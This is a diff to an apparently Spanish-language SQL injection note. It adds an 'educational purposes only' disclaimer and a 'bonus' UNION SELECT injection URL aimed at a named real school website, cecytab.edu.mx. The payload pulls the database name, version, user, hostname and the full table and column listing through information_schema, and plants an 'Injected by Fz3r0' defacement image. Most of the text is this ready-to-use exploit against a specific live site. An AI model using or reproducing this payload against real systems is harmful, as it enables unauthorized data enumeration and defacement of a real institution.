@@ -1,3 +1,5 @@
+- **Solo para fines educativos!!!**
+
 ### Original Dork
 ````bat
 http://cecytab.edu.mx/index.php?page=det_prensa&id=112
@@ -116,6 +118,7 @@ status
 titular
 ````
 
-
-
+## Bonus: Version super basic:
+````bat
 http://cecytab.edu.mx/index.php?page=det_prensa&id=-112' Union Select 1,2,3,4,5,6,concat_ws('<br>','Injected by Fz3r0','<br>','<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png">',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database()))),8,9 --+-
+````
